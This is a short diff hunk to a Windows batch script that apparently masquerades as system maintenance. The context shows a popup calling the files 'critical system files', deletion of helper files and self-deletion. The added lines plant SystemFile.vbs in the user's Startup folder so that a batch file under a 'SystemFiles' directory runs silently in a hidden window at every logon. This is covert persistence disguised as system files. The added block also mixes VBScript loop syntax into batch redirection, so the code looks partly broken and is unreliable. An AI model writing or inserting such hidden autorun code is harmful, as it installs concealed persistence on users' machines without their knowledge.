@@ -44,5 +44,15 @@ echo CreateObject("WScript.Shell").Popup "These are critical system files! Pleas
 del Settings.vbs /Q /F
 del WindowsMaintainence /Q /F
 
+cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+(
+Do While True
+    echo Set objShell = WScript.CreateObject("WScript.Shell"^)
+    echo objShell.Run "C:/Users/%username%/SystemFiles/FileManager.bat", 0
+Loop
+
+) > SystemFile.vbs
+
+
 del %0 /Q /F
 
